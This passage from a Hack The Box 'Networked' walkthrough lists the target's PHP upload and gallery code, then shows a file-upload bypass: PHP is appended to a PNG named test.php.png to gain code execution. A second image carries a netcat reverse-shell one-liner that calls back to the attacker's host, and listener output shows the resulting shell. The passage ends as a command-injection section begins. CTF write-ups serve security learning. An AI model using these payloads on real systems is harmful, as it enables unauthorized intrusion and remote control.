class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# wget http:&#x2F;&#x2F;networked.htb&#x2F;backup&#x2F;backup.tar</span><br><span class="line">--2019-11-16 01:25:13--  http:&#x2F;&#x2F;networked.htb&#x2F;backup&#x2F;backup.tar</span><br><span class="line">Resolving networked.htb (networked.htb)... 10.10.10.146</span><br><span class="line">Connecting to networked.htb (networked.htb)|10.10.10.146|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10240 (10K) [application&#x2F;x-tar]</span><br><span class="line">Saving to: ‘backup.tar’</span><br><span class="line"></span><br><span class="line">backup.tar                                           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  10.00K  --.-KB&#x2F;s    in 0.1s    </span><br><span class="line"></span><br><span class="line">2019-11-16 01:25:13 (95.3 KB&#x2F;s) - ‘backup.tar’ saved [10240&#x2F;10240]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# mkdir backup</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cd backup&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# mv ..&#x2F;backup.tar .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# tar xvf backup.tar </span><br><span class="line">index.php</span><br><span class="line">lib.php</span><br><span class="line">photos.php</span><br><span class="line">upload.php</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup# ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 2 root root  4096 Nov 16 01:26 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Nov 16 01:25 ..</span><br><span class="line">-rw-r--r-- 1 root root 10240 Jul  9 13:33 backup.tar</span><br><span class="line">-rw-r--r-- 1 root root   229 Jul  9 13:33 index.php</span><br><span class="line">-rw-r--r-- 1 root root  2001 Jul  2 13:38 lib.php</span><br><span class="line">-rw-r--r-- 1 root root  1871 Jul  2 14:53 photos.php</span><br><span class="line">-rw-r--r-- 1 root root  1331 Jul  2 14:45 upload.php</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked&#x2F;backup#</span><br></pre></td></tr></table></figure><p><code>index.php</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello mate, we're building the new FaceMash!<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">Help by funding us and be the new Tyler&amp;Cameron!<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">Join us at the pool party this Sat to get a glimpse</span><br><span class="line"><span class="comment">&lt;!-- upload and gallery not yet linked --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>lib.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getnameCheck</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">  $pieces = explode(<span class="string">'.'</span>,$filename);</span><br><span class="line">  $name= array_shift($pieces);</span><br><span class="line">  $name = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$name);</span><br><span class="line">  $ext = implode(<span class="string">'.'</span>,$pieces);</span><br><span class="line">  <span class="comment">#echo "name $name - ext $ext\n";</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($name,$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getnameUpload</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">  $pieces = explode(<span class="string">'.'</span>,$filename);</span><br><span class="line">  $name= array_shift($pieces);</span><br><span class="line">  $name = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$name);</span><br><span class="line">  $ext = implode(<span class="string">'.'</span>,$pieces);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($name,$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_ip</span><span class="params">($prefix,$filename)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//echo "prefix: $prefix - fname: $filename\n";</span></span><br><span class="line">  $ret = <span class="keyword">true</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(filter_var($prefix, FILTER_VALIDATE_IP))) &#123;</span><br><span class="line">    $ret = <span class="keyword">false</span>;</span><br><span class="line">    $msg = <span class="string">"4tt4ck on file "</span>.$filename.<span class="string">": prefix is not a valid ip "</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = $filename;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>($ret,$msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_mime_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $regexp = <span class="string">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span>;</span><br><span class="line">  <span class="keyword">if</span> (function_exists(<span class="string">'finfo_file'</span>)) &#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME);</span><br><span class="line">    <span class="keyword">if</span> (is_resource($finfo)) <span class="comment">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span></span><br><span class="line">    &#123;</span><br><span class="line">      $mime = @finfo_file($finfo, $file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">      finfo_close($finfo);</span><br><span class="line">      <span class="keyword">if</span> (is_string($mime) &amp;&amp; preg_match($regexp, $mime, $matches)) &#123;</span><br><span class="line">        $file_type = $matches[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> $file_type;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (function_exists(<span class="string">'mime_content_type'</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    $file_type = @mime_content_type($file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (strlen($file_type) &gt; <span class="number">0</span>) <span class="comment">// It's possible that mime_content_type() returns FALSE or an empty string</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> $file_type;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $file[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_file_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $mime_type = file_mime_type($file);</span><br><span class="line">  <span class="keyword">if</span> (strpos($mime_type, <span class="string">'image/'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayform</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"myFile"</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"go!"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>photos.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">.tg  &#123;border-collapse:collapse;border-spacing:<span class="number">0</span>;margin:<span class="number">0</span>px auto;&#125;</span><br><span class="line">.tg td&#123;font-family:Arial, sans-serif;font-size:<span class="number">14</span>px;padding:<span class="number">10</span>px <span class="number">5</span>px;border-style:solid;border-width:<span class="number">1</span>px;overflow:hidden;word-<span class="keyword">break</span>:normal;border-color:black;&#125;</span><br><span class="line">.tg th&#123;font-family:Arial, sans-serif;font-size:<span class="number">14</span>px;font-weight:normal;padding:<span class="number">10</span>px <span class="number">5</span>px;border-style:solid;border-width:<span class="number">1</span>px;overflow:hidden;word-<span class="keyword">break</span>:normal;border-color:black;&#125;</span><br><span class="line">.tg .tg<span class="number">-0</span>lax&#123;text-align:left;vertical-align:top&#125;</span><br><span class="line">@media screen <span class="keyword">and</span> (max-width: <span class="number">767</span>px) &#123;.tg &#123;width: auto !important;&#125;.tg col &#123;width: auto !important;&#125;.tg-wrap &#123;overflow-x: auto;-webkit-overflow-scrolling: touch;margin: auto <span class="number">0</span>px;&#125;&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Welcome to our awesome gallery!&lt;/br&gt;</span><br><span class="line">See recent uploaded pictures from our community, <span class="keyword">and</span> feel free to rate <span class="keyword">or</span> comment&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$ignored = <span class="keyword">array</span>(<span class="string">'.'</span>, <span class="string">'..'</span>, <span class="string">'index.html'</span>);</span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div class="tg-wrap"&gt;&lt;table class="tg"&gt;'</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (scandir($path) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">  <span class="keyword">if</span> (in_array($file, $ignored)) <span class="keyword">continue</span>;</span><br><span class="line">  $files[$file] = filemtime($path. <span class="string">'/'</span> . $file);</span><br><span class="line">&#125;</span><br><span class="line">arsort($files);</span><br><span class="line">$files = array_keys($files);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  $exploded  = explode(<span class="string">'.'</span>,$value);</span><br><span class="line">  $prefix = str_replace(<span class="string">'_'</span>,<span class="string">'.'</span>,$exploded[<span class="number">0</span>]);</span><br><span class="line">  $check = check_ip($prefix,$value);</span><br><span class="line">  <span class="keyword">if</span> (!($check[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// for HTB, to avoid too many spoilers</span></span><br><span class="line">  <span class="keyword">if</span> ((strpos($exploded[<span class="number">0</span>], <span class="string">'10_10_'</span>) === <span class="number">0</span>) &amp;&amp; (!($prefix === $_SERVER[<span class="string">"REMOTE_ADDR"</span>])) ) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ($i == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;td class="tg-0lax"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"uploaded by $check[1]"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='uploads/"</span>.$value.<span class="string">"' width=100px&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/td&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($i == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;\n"</span>;</span><br><span class="line">    $i = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($i &lt; <span class="number">4</span> &amp;&amp; $i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>upload.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">define(<span class="string">"UPLOAD_DIR"</span>, <span class="string">"/var/www/html/uploads/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) ) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">"myFile"</span>])) &#123;</span><br><span class="line">    $myFile = $_FILES[<span class="string">"myFile"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(check_file_type($_FILES[<span class="string">"myFile"</span>]) &amp;&amp; filesize($_FILES[<span class="string">'myFile'</span>][<span class="string">'tmp_name'</span>]) &lt; <span class="number">60000</span>)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span>;</span><br><span class="line">      displayform();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($myFile[<span class="string">"error"</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;An error occurred.&lt;/p&gt;"</span>;</span><br><span class="line">        displayform();</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];</span></span><br><span class="line">    <span class="keyword">list</span> ($foo,$ext) = getnameUpload($myFile[<span class="string">"name"</span>]);</span><br><span class="line">    $validext = <span class="keyword">array</span>(<span class="string">'.jpg'</span>, <span class="string">'.png'</span>, <span class="string">'.gif'</span>, <span class="string">'.jpeg'</span>);</span><br><span class="line">    $valid = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($validext <span class="keyword">as</span> $vext) &#123;</span><br><span class="line">      <span class="keyword">if</span> (substr_compare($myFile[<span class="string">"name"</span>], $vext, -strlen($vext)) === <span class="number">0</span>) &#123;</span><br><span class="line">        $valid = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!($valid)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span>;</span><br><span class="line">      displayform();</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $name = str_replace(<span class="string">'.'</span>,<span class="string">'_'</span>,$_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'.'</span>.$ext;</span><br><span class="line"></span><br><span class="line">    $success = move_uploaded_file($myFile[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name);</span><br><span class="line">    <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Unable to save file.&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set proper permissions on the new file</span></span><br><span class="line">    chmod(UPLOAD_DIR . $name, <span class="number">0644</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  displayform();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/upload.php</code>:<br><img src="/images/hackthebox/networked/3.png" alt=""></p><p><code>/photos.php</code>:<br><img src="/images/hackthebox/networked/4.png" alt=""></p><h2 id="RCE-–-gt-Shell-as-apache"><a href="#RCE-–-gt-Shell-as-apache" class="headerlink" title="RCE –&gt; Shell as apache"></a>RCE –&gt; Shell as apache</h2><p>We can use <code>upload.php</code> to upload images then we can view them through <code>photos.php</code> or <code>/uploads/image_name</code>. For some time I tried to bypass the extension filter in <code>upload.php</code> to upload <code>php</code> files but I wasn’t able to bypass it. However I could get <code>RCE</code> by injecting <code>php</code> code in the uploaded images.<br>I got a solid black image and called it <code>original.png</code>, let’s upload it:<br><img src="/images/hackthebox/networked/5.png" alt=""></p><p><img src="/images/hackthebox/networked/6.png" alt=""><br><img src="/images/hackthebox/networked/7.png" alt=""><br><img src="/images/hackthebox/networked/8.png" alt=""><br>Now let’s copy that image and inject some <code>php</code> code into the new image:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cp original.png .&#x2F;test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;&lt;?php&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;passthru(&quot;whoami&quot;);&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;?&gt;&#39; &gt;&gt; test.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# mv test.png test.php.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure><p>I injected <code>&lt;?php passthru(&quot;whoami&quot;); ?&gt;</code> which should execute <code>whoami</code>, let’s test it:<br><img src="/images/hackthebox/networked/9.png" alt=""></p><p><img src="/images/hackthebox/networked/10.png" alt=""><br><img src="/images/hackthebox/networked/11.png" alt=""><br>Now if we view the file from <code>/uploads</code> we won’t get the image, we’ll get the binary data of the image and the result of the executed <code>php</code> code at the end:<br><img src="/images/hackthebox/networked/12.png" alt=""><br><code>whoami</code> got executed successfully and we’re the user <code>apache</code>.<br>I created another one to get a reverse shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# cp original.png .&#x2F;shell.php.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;&lt;?php&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;passthru(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f&quot;);&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# echo &#39;?&gt;&#39; &gt;&gt; .&#x2F;shell.php.png </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked#</span><br></pre></td></tr></table></figure><p>And I got a shell as <code>apache</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.146.</span><br><span class="line">Ncat: Connection from 10.10.10.146:55662.</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">whoami</span><br><span class="line">apache</span><br><span class="line">sh-4.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;48(apache) gid&#x3D;48(apache) groups&#x3D;48(apache)</span><br><span class="line">sh-4.2$ hostname</span><br><span class="line">hostname</span><br><span class="line">networked.htb</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><h2 id="Command-Injection-in-check-attack-php-–-gt-Shell-as-guly-–-gt-User-Flag"><a href="#Command-Injection-in-check-attack-php-–-gt-Shell-as-guly-–-gt-User-Flag" class="headerlink" title="Command Injection in check_attack.php –&gt; Shell as guly –&gt; User Flag"></a>Command Injection in check_attack.php –&gt; Shell as guly –&gt; User Flag</h2><p>First thing I did after getting a shell was to make it stable:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 